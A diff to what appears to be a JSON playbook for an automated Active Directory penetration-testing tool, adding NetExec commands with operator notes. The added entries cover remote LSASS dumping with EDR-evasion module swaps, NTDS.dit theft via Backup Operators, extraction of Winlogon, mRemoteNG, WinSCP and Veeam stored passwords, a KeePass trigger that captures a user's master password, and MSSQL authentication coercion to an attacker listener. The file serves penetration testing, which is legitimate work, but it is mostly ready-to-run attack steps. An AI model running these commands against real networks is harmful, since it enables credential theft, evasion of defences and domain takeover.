@@ -1009,6 +1009,26 @@
           "note": "Who holds WriteDacl/GenericAll/WriteOwner over a high-value object, the ACL edges bloodyad-acl/ad-acl-abuse cash in. Point TARGET at the domain object (base DN) to find who can grant themselves DCSync."
         },
         {
+          "tool": "nxc",
+          "run": "nxc ldap {{target}} -u {{user}} -p '{{password}}' -M adcs",
+          "note": "Enumerate the AD Certificate Services CAs and templates; an ESC1-ESC16 verdict here is the ADCS lead that lights adcs-esc/certifried (then certipy does the req/auth)."
+        },
+        {
+          "tool": "nxc",
+          "run": "nxc ldap {{target}} -u {{user}} -p '{{password}}' -M user-desc",
+          "note": "Dump the 'description' attribute of every account; admins still leave temp/initial passwords there. -M get-desc-users is the same hunt. Any hit is a candidate credential."
+        },
+        {
+          "tool": "nxc",
+          "run": "nxc ldap {{target}} -u {{user}} -p '{{password}}' -M enum_trusts",
+          "note": "Domain and forest trusts (direction + type); an inbound/bidirectional trust is the lead for cross-domain escalation (sid-history-abuse, trust-enum)."
+        },
+        {
+          "tool": "nxc",
+          "run": "nxc ldap {{target}} -u '' -p '' -M pre2k",
+          "note": "Pre-created (pre-Win2000) computer accounts authenticate with the lowercased machine name as the password, an unauthenticated foothold credential when present."
+        },
+        {
           "tool": "bloodyad",
           "run": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' get writable --detail",
           "web": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' get writable --detail | tee {{scandir}}/bloodyad-writable.txt",
@@ -1093,7 +1113,17 @@
         {
           "tool": "nxc",
           "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' -M lsassy",
-          "note": "Remote LSASS dump from Kali, the preferred alternative to getting on the box with mimikatz/procdump: nxc drives lsassy to pull logged-on plaintext and NT hashes over SMB. Use -H {{hash}} for pass-the-hash. Try -M nanodump for an EDR-quieter dump of the same memory. This is the remote twin of the on-host LSASS dump."
+          "note": "Remote LSASS dump from Kali, the preferred alternative to getting on the box with mimikatz/procdump: nxc drives lsassy to pull logged-on plaintext and NT hashes over SMB. Use -H {{hash}} for pass-the-hash. EDR in the way? Swap the module for an evasion variant that dumps the same memory: -M nanodump, -M handlekatz, -M procdump, or -M masky (ADCS-backed). This is the remote twin of the on-host LSASS dump."
+        },
+        {
+          "tool": "nxc",
+          "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' -M backup_operator",
+          "note": "SeBackupPrivilege / Backup Operators path: with that right (no full admin needed) nxc remotely backs up the SAM+SYSTEM hives and, on a DC, NTDS.dit — every hash, no LSASS touch. The classic 'Backup Operator to Domain Admin' route."
+        },
+        {
+          "tool": "nxc",
+          "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' -M reg-winlogon",
+          "note": "Pull Winlogon autologon secrets (DefaultUserName/DefaultPassword) straight from the remote registry, cleartext when set. -M reg-query reads any other registry value you name."
         },
         {
           "tool": "mimikatz",
@@ -1318,6 +1348,68 @@
           "tool": "impacket-wmiexec",
           "run": "impacket-wmiexec '{{domain}}/{{user}}:{{password}}'@{{target}}",
           "note": "Stealthier; it creates no service."
+        }
+      ]
+    },
+    {
+      "id": "remote-app-creds",
+      "title": "Harvest Stored Application Credentials (NetExec)",
+      "hypothesis": "Admin tools and connection managers cache credentials on disk that nxc decrypts remotely: mRemoteNG/WinSCP/PuTTY session passwords, Veeam backup creds, and KeePass (discover the .kdbx, then arm a trigger to capture the master password on next unlock). These are high-value lateral/privesc creds that never touched LSASS.",
+      "tool": "nxc",
+      "tools": [
+        "nxc"
+      ],
+      "os": [
+        "windows"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "foothold.windows",
+        "access.admin",
+        "access.system"
+      ],
+      "deprioritize_when": [
+        "loot.ntds"
+      ],
+      "produces": [
+        "credential.candidate"
+      ],
+      "priority": 70,
+      "phase": "loot",
+      "proves": "recovers credentials cached by admin/connection-manager applications on the host",
+      "does_not_prove": "a validated credential until one is reused successfully, and KeePass trigger capture needs the victim to unlock the database",
+      "report": {
+        "finding": "Credentials Recoverable from Installed Applications",
+        "severity": "high"
+      },
+      "refs": [
+        "https://www.netexec.wiki/smb-protocol/modules"
+      ],
+      "commands": [
+        {
+          "tool": "nxc",
+          "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' -M mremoteng",
+          "note": "mRemoteNG stores connection passwords in confCons.xml, reversibly encrypted. nxc decrypts them remotely to cleartext — frequently domain-admin or service creds."
+        },
+        {
+          "tool": "nxc",
+          "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' -M winscp",
+          "note": "WinSCP saved-session credentials from the registry/INI; -M putty does the same for stored PuTTY sessions."
+        },
+        {
+          "tool": "nxc",
+          "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' -M veeam",
+          "note": "Veeam Backup & Replication stores credentials (often domain admin) in its config DB; nxc extracts and decrypts them. A classic one-shot to DA."
+        },
+        {
+          "tool": "nxc",
+          "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' -M keepass_discover",
+          "note": "Step 1: locate any KeePass .kdbx and the running KeePass process. Then -M keepass_trigger arms a config trigger that exports the master password to disk the next time the user unlocks the database; read it back with another run."
+        },
+        {
+          "tool": "nxc",
+          "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' -M keepass_trigger -o ACTION=ADD",
+          "note": "Step 2 (needs the user to unlock KeePass afterwards): the trigger writes the cleartext master password; a follow-up -o ACTION=READ (or reading the dropped file) recovers it. Clean up with ACTION=CLEAN."
         }
       ]
     },
@@ -2570,6 +2662,11 @@
           "tool": "nxc",
           "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' -M coerce_plus -o LISTENER={{lhost}}",
           "note": "PREFERRED, from Kali: nxc's coerce_plus checks which coercion vectors (MS-EFSR/MS-RPRN/MS-DFSNM/MS-FSRVP) the target answers and fires them at your listener ({{lhost}}) in one module. Run -o LISTENER=... ALWAYS; add METHOD=PetitPotam to pin one. Start Responder or ntlmrelayx on {{lhost}} FIRST. Drop -u/-p for the unauth PetitPotam paths some DCs still allow."
+        },
+        {
+          "tool": "nxc",
+          "run": "nxc mssql {{target}} -u {{user}} -p '{{password}}' -M mssql_coerce -o LISTENER={{lhost}}",
+          "note": "When MSSQL (1433) is exposed: coerce the SQL service account's machine auth to your listener via xp_dirtree/xp_fileexist. Same relay payoff, a different trigger when SMB coercion is patched."
         },
         {
           "tool": "coercer",
